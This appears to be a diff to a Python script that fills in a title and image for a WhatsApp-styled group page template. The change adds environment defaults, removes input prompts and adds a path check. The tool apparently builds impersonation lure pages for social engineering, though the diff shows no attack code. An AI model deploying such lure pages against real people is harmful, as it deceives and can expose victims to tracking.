@@ -9,29 +9,25 @@ G = '\033[32m' # green
 C = '\033[36m' # cyan
 W = '\033[0m'  # white
 
-title = os.getenv('TITLE')
-image = os.getenv('IMAGE')
+title = os.getenv('TITLE', 'Demo Group')
+image = os.getenv('IMAGE', 'template/whatsapp/images/ZIvBTrQd9nP.png')
 
-if title is None:
-    title = input(f'{G}[+] {C}Group Title : {W}')
-else:
-    utils.print(f'{G}[+] {C}Group Title :{W} '+title)
-
-if image is None:
-    image = input(f'{G}[+] {C}Path to Group Img (Best Size : 300x300): {W}')
-else:
-    utils.print(f'{G}[+] {C}Group Image :{W} '+image)
+utils.print(f'{G}[+] {C}Group Title :{W} ' + title)
+utils.print(f'{G}[+] {C}Group Image :{W} ' + image)
 
 img_name = utils.downloadImageFromUrl(image, 'template/whatsapp/images/')
-if img_name :
+if img_name:
     img_name = img_name.split('/')[-1]
 else:
     img_name = image.split('/')[-1]
-    try:
-        shutil.copyfile(image, 'template/whatsapp/images/{}'.format(img_name))
-    except Exception as e:
-        utils.print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
-        exit()
+    src_path = os.path.abspath(image)
+    dst_path = os.path.abspath(f'template/whatsapp/images/{img_name}')
+    if os.path.abspath(src_path) != os.path.abspath(dst_path):
+        try:
+            shutil.copyfile(image, dst_path)
+        except Exception as e:
+            utils.print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
+            exit()
 
 with open('template/whatsapp/index_temp.html', 'r') as index_temp:
     code = index_temp.read()
